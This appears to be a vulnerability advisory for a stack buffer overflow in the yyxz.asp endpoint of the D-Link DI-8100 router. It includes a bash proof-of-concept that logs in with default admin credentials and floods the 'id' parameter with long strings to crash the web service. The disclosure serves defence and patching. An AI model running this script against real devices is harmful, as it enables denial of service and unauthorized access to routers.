## 1. Affected Products

| Vendor | Product | Version |
| :--- | :--- | :--- |
| D-Link | DI-8100 | Firmware v16.07.26A1 (possibly earlier versions) |

## 2. Vulnerability Details

### 2.1. Description
The `yyxz.asp` endpoint contains an insecure call to the `sprintf` function. When processing the user-supplied `id` parameter, the application fails to perform any length validation or input sanitization. It concatenates the user-controlled string with the prefix `yyxz_dlink_asp` and writes the result into a small stack buffer.

### 2.2. Code Snippet
<img width="1622" height="412" alt="image" src="https://github.com/user-attachments/assets/c058a86f-dac0-4a1d-8ff7-4005636da113" />


### 2.3. Attack Vectors
- **Remote**: Yes
- **Authentication Required**: Yes (Valid login credentials for the administrative web interface)
- **Complexity**: Low
- **User Interaction**: None

### 2.4. Proof of Concept (PoC)
Sending an HTTP POST request to `/yyxz.asp` with a long string in the `id` parameter causes the HTTP service to crash.

```
TARGET="192.168.0.1"
COOKIE_FILE="cookies.txt"

# Step 1: 登录
echo "[*] Step 1: Login..."
LOGIN_RESP=$(curl -s -c $COOKIE_FILE -X POST "http://$TARGET/login.cgi" \
  -d "user=admin&password=admin" 2>&1)
echo "[+] Login done"

echo ""
echo "[*] Step 2: Testing buffer overflow vulnerability..."
echo ""

PAYLOAD=$(python3 -c "print('A' * 1000)")

echo "[*] Sending payload with length: ${#PAYLOAD}"
RESP=$(curl -s -b $COOKIE_FILE -X POST "http://$TARGET/yyxz.asp" \
  -d "id=$PAYLOAD" 2>&1)

echo "[*] Response received"
if [ $? -ne 0 ]; then
    echo "[!] Connection error - possible crash detected!"
else
    echo "[*] Response status: Success (no crash detected)"
    echo "[*] Response length: ${#RESP}"
fi

echo ""
echo "[*] Step 3: Testing different payload lengths..."
echo ""


for length in 100 200 500 1000 2000; do
    PAYLOAD=$(python3 -c "print('A' * $length)")
    echo "[*] Testing payload length: $length"
    curl -s -b $COOKIE_FILE -X POST "http://$TARGET/yyxz.asp" \
      -d "id=$PAYLOAD" > /dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo "[!] Connection error with payload length $length - possible crash!"
        break
    fi
done

echo ""
echo "[*] Exploit completed!"#
```

**Response:**
<img width="2209" height="802" alt="image" src="https://github.com/user-attachments/assets/32499c70-4987-42a8-8c06-239fb11e644b" />


## 3. Impact

- **Confidentiality**: High - Arbitrary code execution could lead to full system compromise.
- **Integrity**: High - Attackers could modify system settings or files.
- **Availability**: High - The vulnerability can be used to reliably crash the device, causing a Denial of Service (DoS).




